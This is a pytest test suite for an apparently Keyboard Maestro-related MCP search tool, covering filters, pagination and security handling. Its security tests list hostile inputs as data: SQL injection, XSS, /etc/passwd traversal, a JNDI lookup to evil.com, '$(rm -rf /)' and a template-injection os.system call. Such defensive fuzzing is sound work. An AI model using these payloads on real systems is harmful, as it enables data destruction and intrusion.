"""Comprehensive Test Suite for Search Tools - Following Proven MCP Tool Test Pattern.

This test suite validates the Search Tools functionality using the systematic
testing approach that achieved 100% success rate across 8 tool suites.

Test Coverage:
- Search action functionality with comprehensive filter validation
- Mock action generation helper functions
- Security validation and search injection prevention
- Property-based testing for robust input validation
- Integration testing with mocked dependencies
- Error handling for all failure scenarios
- Performance testing for search limits and pagination

Testing Strategy:
- Property-based testing with Hypothesis for comprehensive input coverage
- Mock-based testing for external dependencies (KM client, macro operations)
- Security validation for search injection prevention
- Integration testing scenarios with realistic data
- Performance and timeout testing with result limits
"""

from __future__ import annotations

from typing import Any, Optional
from unittest.mock import AsyncMock, Mock, patch

import pytest
from fastmcp import Context
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st
from hypothesis.strategies import composite

# Import core types and errors
# Import the tools we're testing
from src.server.tools.search_tools import _generate_mock_actions, km_search_actions


# Test fixtures following proven pattern
@pytest.fixture
def mock_context() -> Any:
    """Create mock FastMCP context following successful pattern."""
    context = Mock(spec=Context)
    context.info = AsyncMock()
    context.warn = AsyncMock()
    context.error = AsyncMock()
    context.report_progress = AsyncMock()
    context.read_resource = AsyncMock()
    context.sample = AsyncMock()
    return context


@pytest.fixture
def mock_km_client() -> Any:
    """Create mock KM client with standard interface."""
    client = Mock()
    client.check_connection = Mock()
    client.list_macros_with_details = Mock()
    client.execute_macro = Mock()
    client.modify_macro = Mock()
    return client


@pytest.fixture
def sample_macro_data() -> Any:
    """Sample macro data for testing."""
    return {
        "id": "12345678-1234-1234-1234-123456789012",
        "name": "Test Text Macro",
        "enabled": True,
        "group": "Text Processing",
        "trigger_count": 2,
        "action_count": 3,
        "creation_date": "2024-01-01T00:00:00Z",
        "modification_date": "2024-12-01T00:00:00Z",
        "last_used": "2024-12-01T10:00:00Z",
        "used_count": 15,
    }


@pytest.fixture
def sample_macros_list() -> Any:
    """Sample list of macros for testing."""
    return [
        {
            "id": "12345678-1234-1234-1234-123456789012",
            "name": "Test Text Macro",
            "enabled": True,
            "group": "Text Processing",
            "trigger_count": 2,
            "action_count": 3,
            "creation_date": "2024-01-01T00:00:00Z",
            "modification_date": "2024-12-01T00:00:00Z",
            "last_used": "2024-12-01T10:00:00Z",
            "used_count": 15,
        },
        {
            "id": "87654321-4321-4321-4321-210987654321",
            "name": "Application Control",
            "enabled": False,
            "group": "Application Management",
            "trigger_count": 1,
            "action_count": 2,
            "creation_date": "2024-01-02T00:00:00Z",
            "modification_date": "2024-11-01T00:00:00Z",
            "last_used": "Never",
            "used_count": 0,
        },
        {
            "id": "11111111-2222-3333-4444-555555555555",
            "name": "File Operations Script",
            "enabled": True,
            "group": "File Management",
            "trigger_count": 3,
            "action_count": 4,
            "creation_date": "2024-01-03T00:00:00Z",
            "modification_date": "2024-12-01T12:00:00Z",
            "last_used": "2024-12-01T14:00:00Z",
            "used_count": 25,
        },
    ]


@pytest.fixture
def sample_actions_data() -> Any:
    """Sample actions data for testing."""
    return [
        {
            "id": "action_1",
            "type": "Type a String",
            "index": 0,
            "enabled": True,
            "config": {"text": "Hello World", "simulate_keystrokes": True},
        },
        {
            "id": "action_2",
            "type": "Execute AppleScript",
            "index": 1,
            "enabled": True,
            "config": {
                "script": 'tell application "Finder" to activate',
                "timeout": 10,
            },
        },
        {
            "id": "action_3",
            "type": "If Then Else",
            "index": 2,
            "enabled": True,
            "config": {
                "condition": "Variable 'Status' is 'Ready'",
                "then_actions": ["Continue"],
                "else_actions": ["Cancel Macro"],
            },
        },
    ]


@composite
def valid_search_parameters(draw) -> Any:
    """Generate valid search parameters for property-based testing."""
    params = {}

    # Action type - valid action types from KM
    if draw(st.booleans()):
        action_type = draw(
            st.sampled_from(
                [
                    "Type a String",
                    "Execute AppleScript",
                    "If Then Else",
                    "Activate a Specific Application",
                    "Move or Rename File",
                    "Insert Text by Pasting",
                    "Set Variable to Text",
                    "Pause",
                ],
            ),
        )
        params["action_type"] = action_type

    # Macro filter - valid macro name or UUID
    if draw(st.booleans()):
        macro_filter = draw(
            st.one_of(
                st.text(min_size=1, max_size=50).filter(lambda x: x.strip()),
                st.uuids().map(str),
            ),
        )
        params["macro_filter"] = macro_filter

    # Content search - safe search terms
    if draw(st.booleans()):
        content_search = draw(
            st.text(
                alphabet=st.characters(
                    whitelist_categories=("Lu", "Ll", "Nd"),
                    whitelist_characters=" -_.@",
                ),
                min_size=1,
                max_size=255,
            ),
        )
        if content_search.strip():
            params["content_search"] = content_search

    # Include disabled
    if draw(st.booleans()):
        params["include_disabled"] = draw(st.booleans())

    # Category
    if draw(st.booleans()):
        category = draw(
            st.sampled_from(
                [
                    "application",
                    "file",
                    "text",
                    "system",
                    "variable",
                    "control",
                ],
            ),
        )
        params["category"] = category

    # Limit
    if draw(st.booleans()):
        limit = draw(st.integers(min_value=1, max_value=100))
        params["limit"] = limit

    return params


@composite
def malicious_search_inputs(draw) -> Any:
    """Generate potentially malicious search inputs for security testing."""
    malicious_patterns = [
        "'; DROP TABLE macros; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com}",
        "javascript:alert('xss')",
        "$(rm -rf /)",
        "{{7*7}}",
        "${sleep(10)}",
        "\\x00\\x01\\x02",
        "' OR '1'='1",
        "{% raw %}{{config.__class__.__init__.__globals__['os'].system('ls')}}{% endraw %}",
    ]

    return {
        "action_type": draw(st.sampled_from(malicious_patterns)),
        "macro_filter": draw(st.sampled_from(malicious_patterns)),
        "content_search": draw(st.sampled_from(malicious_patterns)),
    }


class TestKMSearchActions:
    """Test main search actions functionality with comprehensive validation."""

    @pytest.mark.asyncio
    async def test_search_actions_success_basic(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test successful basic action search."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert "data" in result
            assert "actions" in result["data"]
            assert "total_found" in result["data"]
            assert "search_criteria" in result["data"]
            assert "timestamp" in result["data"]
            assert isinstance(result["data"]["actions"], list)
            assert result["data"]["total_found"] >= 0

            # Verify context interaction
            mock_context.info.assert_called()
            mock_context.report_progress.assert_called()

    @pytest.mark.asyncio
    async def test_search_actions_with_action_type_filter(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with action type filter."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(
                action_type="Type a String",
                ctx=mock_context,
            )

            # Verify
            assert result["success"] is True
            assert result["data"]["search_criteria"]["action_type"] == "Type a String"

            # Verify all returned actions match the filter
            for action in result["data"]["actions"]:
                assert action["type"] == "Type a String"

    @pytest.mark.asyncio
    async def test_search_actions_with_macro_filter(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with macro filter."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(macro_filter="Text", ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert result["data"]["search_criteria"]["macro_filter"] == "Text"

            # Verify all returned actions come from matching macros
            for action in result["data"]["actions"]:
                assert "text" in action["macro_name"].lower()

    @pytest.mark.asyncio
    async def test_search_actions_with_content_search(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with content search."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(content_search="Hello", ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert result["data"]["search_criteria"]["content_search"] == "Hello"

    @pytest.mark.asyncio
    async def test_search_actions_include_disabled(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search including disabled macros."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(include_disabled=True, ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert result["data"]["search_criteria"]["include_disabled"] is True

            # Verify enabled_only parameter was set correctly
            mock_km_client.list_macros_with_details.assert_called_with(False)

    @pytest.mark.asyncio
    async def test_search_actions_with_category_filter(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with category filter."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(category="text", ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert result["data"]["search_criteria"]["category"] == "text"

    @pytest.mark.asyncio
    async def test_search_actions_with_limit(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with result limit."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(limit=5, ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert len(result["data"]["actions"]) <= 5

    @pytest.mark.asyncio
    async def test_search_actions_combined_filters(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with multiple filters combined."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(
                action_type="Type a String",
                macro_filter="Text",
                content_search="Hello",
                include_disabled=False,
                category="text",
                limit=10,
                ctx=mock_context,
            )

            # Verify
            assert result["success"] is True
            search_criteria = result["data"]["search_criteria"]
            assert search_criteria["action_type"] == "Type a String"
            assert search_criteria["macro_filter"] == "Text"
            assert search_criteria["content_search"] == "Hello"
            assert search_criteria["include_disabled"] is False
            assert search_criteria["category"] == "text"
            assert len(result["data"]["actions"]) <= 10

    @pytest.mark.asyncio
    async def test_search_actions_macro_fetch_error(self, mock_context, mock_km_client) -> None:
        """Test search when macro fetch fails."""
        # Setup
        mock_error = Mock()
        mock_error.code = "CONNECTION_ERROR"
        mock_error.message = "Failed to connect to KM"

        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = True
        mock_km_client.list_macros_with_details.return_value.get_left.return_value = (
            mock_error
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context)

            # Verify
            assert result["success"] is False
            assert result["error"]["code"] == "MACRO_FETCH_ERROR"
            assert "Failed to fetch macros" in result["error"]["message"]
            assert str(mock_error) in result["error"]["details"]

    @pytest.mark.asyncio
    async def test_search_actions_empty_results(self, mock_context, mock_km_client) -> None:
        """Test search with no matching results."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = []

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert result["data"]["total_found"] == 0
            assert result["data"]["actions"] == []

    @pytest.mark.asyncio
    async def test_search_actions_exception_handling(
        self,
        mock_context,
        mock_km_client,
    ) -> None:
        """Test search with unexpected exception."""
        # Setup
        mock_km_client.list_macros_with_details.side_effect = Exception(
            "Unexpected error",
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context)

            # Verify
            assert result["success"] is False
            assert result["error"]["code"] == "SEARCH_ERROR"
            assert "Failed to search actions" in result["error"]["message"]
            assert "Unexpected error" in result["error"]["details"]
            assert "recovery_suggestion" in result["error"]

            # Verify context error was called
            mock_context.error.assert_called()

    @pytest.mark.asyncio
    async def test_search_actions_result_sorting(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test that search results are properly sorted."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context)

            # Verify
            assert result["success"] is True
            actions = result["data"]["actions"]

            if len(actions) > 1:
                # Verify enabled macros come first
                enabled_actions = [a for a in actions if a["macro_enabled"]]
                disabled_actions = [a for a in actions if not a["macro_enabled"]]

                if enabled_actions and disabled_actions:
                    # All enabled should come before all disabled
                    first_disabled_index = next(
                        i for i, a in enumerate(actions) if not a["macro_enabled"]
                    )
                    last_enabled_index = next(
                        i for i, a in enumerate(reversed(actions)) if a["macro_enabled"]
                    )
                    last_enabled_index = len(actions) - 1 - last_enabled_index

                    assert last_enabled_index < first_disabled_index


class TestSearchToolsHelperFunctions:
    """Test helper functions for search tools."""

    def test_generate_mock_actions_text_macro(self) -> None:
        """Test mock action generation for text-based macros."""
        # Execute
        actions = _generate_mock_actions("Test Text Processing", "macro-123")

        # Verify
        assert len(actions) > 0
        assert any(action["type"] == "Type a String" for action in actions)
        assert any(action["type"] == "Insert Text by Pasting" for action in actions)

        # Verify all actions have required fields
        for action in actions:
            assert "id" in action
            assert "type" in action
            assert "index" in action
            assert "enabled" in action
            assert "config" in action
            assert action["id"].startswith("macro-123")

    def test_generate_mock_actions_application_macro(self) -> None:
        """Test mock action generation for application-based macros."""
        # Execute
        actions = _generate_mock_actions("Application Control", "macro-456")

        # Verify
        assert len(actions) > 0
        assert any(
            action["type"] == "Activate a Specific Application" for action in actions
        )

        # Verify all actions have required fields
        for action in actions:
            assert "id" in action
            assert "type" in action
            assert "index" in action
            assert "enabled" in action
            assert "config" in action
            assert action["id"].startswith("macro-456")

    def test_generate_mock_actions_file_macro(self) -> None:
        """Test mock action generation for file-based macros."""
        # Execute
        actions = _generate_mock_actions("File Operations", "macro-789")

        # Verify
        assert len(actions) > 0
        assert any(action["type"] == "Move or Rename File" for action in actions)

        # Verify all actions have required fields
        for action in actions:
            assert "id" in action
            assert "type" in action
            assert "index" in action
            assert "enabled" in action
            assert "config" in action
            assert action["id"].startswith("macro-789")

    def test_generate_mock_actions_script_macro(self) -> None:
        """Test mock action generation for script-based macros."""
        # Execute
        actions = _generate_mock_actions("Script Execution", "macro-101")

        # Verify
        assert len(actions) > 0
        assert any(action["type"] == "Execute AppleScript" for action in actions)

        # Verify all actions have required fields
        for action in actions:
            assert "id" in action
            assert "type" in action
            assert "index" in action
            assert "enabled" in action
            assert "config" in action
            assert action["id"].startswith("macro-101")

    def test_generate_mock_actions_default_macro(self) -> None:
        """Test mock action generation for generic macros."""
        # Execute
        actions = _generate_mock_actions("Generic Macro", "macro-999")

        # Verify
        assert len(actions) > 0
        assert any(action["type"] == "Pause" for action in actions)

        # Verify all actions have required fields
        for action in actions:
            assert "id" in action
            assert "type" in action
            assert "index" in action
            assert "enabled" in action
            assert "config" in action
            assert action["id"].startswith("macro-999")

    def test_generate_mock_actions_control_flow_addition(self) -> None:
        """Test that control flow actions are added to pattern-matched macros."""
        # Execute
        actions = _generate_mock_actions("Test Text Processing", "macro-control")

        # Verify
        assert len(actions) > 1  # Should have original actions plus control flow
        assert any(action["type"] == "If Then Else" for action in actions)

        # Verify control flow action is last
        control_action = next(
            action for action in actions if action["type"] == "If Then Else"
        )
        assert control_action["index"] == len(actions) - 1

    def test_generate_mock_actions_unique_ids(self) -> None:
        """Test that generated actions have unique IDs."""
        # Execute
        actions = _generate_mock_actions("Test Macro", "macro-unique")

        # Verify
        action_ids = [action["id"] for action in actions]
        assert len(action_ids) == len(set(action_ids))  # All IDs should be unique

    def test_generate_mock_actions_sequential_indices(self) -> None:
        """Test that generated actions have sequential indices."""
        # Execute
        actions = _generate_mock_actions("Test Macro", "macro-sequential")

        # Verify
        indices = [action["index"] for action in actions]
        assert indices == list(range(len(indices)))  # Should be 0, 1, 2, ...


class TestSearchToolsIntegration:
    """Test complex search workflow integration scenarios."""

    @pytest.mark.asyncio
    async def test_complex_search_workflow(self, mock_context, mock_km_client) -> None:
        """Test complex search workflow with multiple operations."""
        # Setup large macro list
        large_macro_list = []
        for i in range(20):
            large_macro_list.append(
                {
                    "id": f"macro-{i:04d}",
                    "name": f"Test Macro {i}",
                    "enabled": i % 2 == 0,  # Alternate enabled/disabled
                    "group": f"Group {i % 3}",
                    "trigger_count": i,
                    "action_count": i + 1,
                    "creation_date": "2024-01-01T00:00:00Z",
                    "modification_date": "2024-12-01T00:00:00Z",
                    "last_used": "2024-12-01T10:00:00Z",
                    "used_count": i * 2,
                },
            )

        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            large_macro_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute multiple searches
            results = []

            # Search 1: Basic search
            result1 = await km_search_actions(ctx=mock_context)
            results.append(result1)

            # Search 2: Filtered search
            result2 = await km_search_actions(
                action_type="Type a String",
                limit=5,
                ctx=mock_context,
            )
            results.append(result2)

            # Search 3: Category search
            result3 = await km_search_actions(
                category="text",
                include_disabled=True,
                ctx=mock_context,
            )
            results.append(result3)

            # Verify all searches succeeded
            for result in results:
                assert result["success"] is True
                assert "data" in result
                assert "actions" in result["data"]
                assert "total_found" in result["data"]

            # Verify filtered search respected limit
            assert len(result2["data"]["actions"]) <= 5

            # Verify category search included disabled macros
            assert result3["data"]["search_criteria"]["include_disabled"] is True

    @pytest.mark.asyncio
    async def test_search_pagination_behavior(self, mock_context, mock_km_client) -> None:
        """Test search pagination with different limits."""
        # Setup
        macro_list = []
        for i in range(100):  # Large number of macros
            macro_list.append(
                {
                    "id": f"macro-{i:04d}",
                    "name": f"Test Macro {i}",
                    "enabled": True,
                    "group": "Test Group",
                    "trigger_count": 1,
                    "action_count": 2,
                    "creation_date": "2024-01-01T00:00:00Z",
                    "modification_date": "2024-12-01T00:00:00Z",
                    "last_used": "2024-12-01T10:00:00Z",
                    "used_count": 1,
                },
            )

        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            macro_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Test different limits
            for limit in [1, 5, 10, 25, 50, 100]:
                result = await km_search_actions(limit=limit, ctx=mock_context)

                assert result["success"] is True
                assert len(result["data"]["actions"]) <= limit
                assert result["data"]["total_found"] <= limit

    @pytest.mark.asyncio
    async def test_search_with_progress_reporting(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test that search properly reports progress."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context)

            # Verify
            assert result["success"] is True

            # Verify progress reporting was called
            assert mock_context.report_progress.call_count >= 3

            # Verify progress calls were made with expected values
            progress_calls = mock_context.report_progress.call_args_list
            assert any(
                call[0][0] == 20 for call in progress_calls
            )  # Fetching macro library
            assert any(call[0][0] == 40 for call in progress_calls)  # Analyzing actions
            assert any(call[0][0] == 100 for call in progress_calls)  # Search completed


class TestSearchToolsSecurity:
    """Test security aspects of search functionality."""

    @pytest.mark.asyncio
    async def test_search_input_validation(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test input validation for search parameters."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Test content search length validation
            long_content = "x" * 256  # Over 255 character limit

            # This should be handled gracefully without breaking
            result = await km_search_actions(
                content_search=long_content,
                ctx=mock_context,
            )

            # The function should handle this gracefully
            assert result["success"] is True or result["success"] is False

    @pytest.mark.asyncio
    async def test_search_malicious_input_handling(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test handling of potentially malicious search inputs."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        malicious_inputs = [
            "'; DROP TABLE macros; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "javascript:alert('xss')",
            "\\x00\\x01\\x02",
        ]

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            for malicious_input in malicious_inputs:
                # Test each malicious input
                result = await km_search_actions(
                    content_search=malicious_input,
                    ctx=mock_context,
                )

                # Should not cause crashes or security issues
                assert result["success"] is True or result["success"] is False

                # If successful, verify the search was performed safely
                if result["success"]:
                    assert "data" in result
                    assert "actions" in result["data"]

    @pytest.mark.asyncio
    async def test_search_category_validation(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test category parameter validation."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        valid_categories = [
            "application",
            "file",
            "text",
            "system",
            "variable",
            "control",
        ]

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Test valid categories
            for category in valid_categories:
                result = await km_search_actions(category=category, ctx=mock_context)

                assert result["success"] is True
                assert result["data"]["search_criteria"]["category"] == category

    @pytest.mark.asyncio
    async def test_search_limit_validation(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test limit parameter validation."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Test valid limits
            for limit in [1, 25, 50, 100]:
                result = await km_search_actions(limit=limit, ctx=mock_context)

                assert result["success"] is True
                assert len(result["data"]["actions"]) <= limit


class TestSearchToolsPropertyBased:
    """Property-based testing for search tools using Hypothesis."""

    @pytest.mark.asyncio
    @given(search_params=valid_search_parameters())
    @settings(
        max_examples=20,
        deadline=5000,
        suppress_health_check=[HealthCheck.function_scoped_fixture],
    )
    async def test_search_with_valid_parameters(
        self,
        search_params,
        mock_context,
        mock_km_client,
    ) -> None:
        """Test search with randomly generated valid parameters."""
        # Setup
        sample_macros = [
            {
                "id": "12345678-1234-1234-1234-123456789012",
                "name": "Test Macro",
                "enabled": True,
                "group": "Test Group",
                "trigger_count": 1,
                "action_count": 2,
                "creation_date": "2024-01-01T00:00:00Z",
                "modification_date": "2024-12-01T00:00:00Z",
                "last_used": "2024-12-01T10:00:00Z",
                "used_count": 5,
            },
        ]

        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context, **search_params)

            # Verify
            assert result["success"] is True
            assert "data" in result
            assert "actions" in result["data"]
            assert "total_found" in result["data"]
            assert "search_criteria" in result["data"]
            assert "timestamp" in result["data"]

            # Verify search criteria match input parameters (exclude limit as it's not in response)
            search_criteria = result["data"]["search_criteria"]
            for param, value in search_params.items():
                if (
                    param != "limit"
                ):  # limit is not included in search_criteria response
                    assert search_criteria[param] == value

    @pytest.mark.asyncio
    @given(malicious_params=malicious_search_inputs())
    @settings(
        max_examples=10,
        deadline=5000,
        suppress_health_check=[HealthCheck.function_scoped_fixture],
    )
    async def test_search_security_with_malicious_inputs(
        self,
        malicious_params,
        mock_context,
        mock_km_client,
    ) -> None:
        """Test search security with potentially malicious inputs."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = []

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute - should not crash or cause security issues
            result = await km_search_actions(ctx=mock_context, **malicious_params)

            # Verify - should handle gracefully
            assert result["success"] is True or result["success"] is False

            # Should not cause system compromise
            if result["success"]:
                assert "data" in result
                assert isinstance(result["data"], dict)

    @given(st.text(min_size=1, max_size=100))
    def test_generate_mock_actions_property(self, macro_name) -> None:
        """Test mock action generation with various macro names."""
        # Execute
        actions = _generate_mock_actions(macro_name, "test-id")

        # Verify properties that should always hold
        assert len(actions) > 0
        assert all(isinstance(action, dict) for action in actions)
        assert all("id" in action for action in actions)
        assert all("type" in action for action in actions)
        assert all("index" in action for action in actions)
        assert all("enabled" in action for action in actions)
        assert all("config" in action for action in actions)
        assert all(action["id"].startswith("test-id") for action in actions)

        # Verify indices are sequential
        indices = [action["index"] for action in actions]
        assert indices == list(range(len(indices)))


class TestSearchToolsPerformance:
    """Test performance aspects of search functionality."""

    @pytest.mark.asyncio
    async def test_search_performance_with_large_dataset(
        self,
        mock_context,
        mock_km_client,
    ) -> None:
        """Test search performance with large number of macros."""
        # Setup large dataset
        large_macro_list = []
        for i in range(1000):  # Large number of macros
            large_macro_list.append(
                {
                    "id": f"macro-{i:04d}",
                    "name": f"Test Macro {i}",
                    "enabled": True,
                    "group": f"Group {i % 10}",
                    "trigger_count": 1,
                    "action_count": 2,
                    "creation_date": "2024-01-01T00:00:00Z",
                    "modification_date": "2024-12-01T00:00:00Z",
                    "last_used": "2024-12-01T10:00:00Z",
                    "used_count": 1,
                },
            )

        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            large_macro_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            import time

            start_time = time.time()

            result = await km_search_actions(
                limit=50,  # Reasonable limit
                ctx=mock_context,
            )

            end_time = time.time()
            execution_time = end_time - start_time

            # Verify
            assert result["success"] is True
            assert len(result["data"]["actions"]) <= 50

            # Performance should be reasonable (under 5 seconds for this test)
            assert execution_time < 5.0

    @pytest.mark.asyncio
    async def test_search_limit_enforcement(self, mock_context, mock_km_client) -> None:
        """Test that search limits are properly enforced."""
        # Setup
        macro_list = []
        for i in range(50):
            macro_list.append(
                {
                    "id": f"macro-{i:04d}",
                    "name": f"Test Macro {i}",
                    "enabled": True,
                    "group": "Test Group",
                    "trigger_count": 1,
                    "action_count": 3,  # Each macro will generate 3+ actions
                    "creation_date": "2024-01-01T00:00:00Z",
                    "modification_date": "2024-12-01T00:00:00Z",
                    "last_used": "2024-12-01T10:00:00Z",
                    "used_count": 1,
                },
            )

        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            macro_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Test various limits
            for limit in [5, 10, 25, 50]:
                result = await km_search_actions(limit=limit, ctx=mock_context)

                assert result["success"] is True
                assert len(result["data"]["actions"]) <= limit
                assert result["data"]["total_found"] <= limit

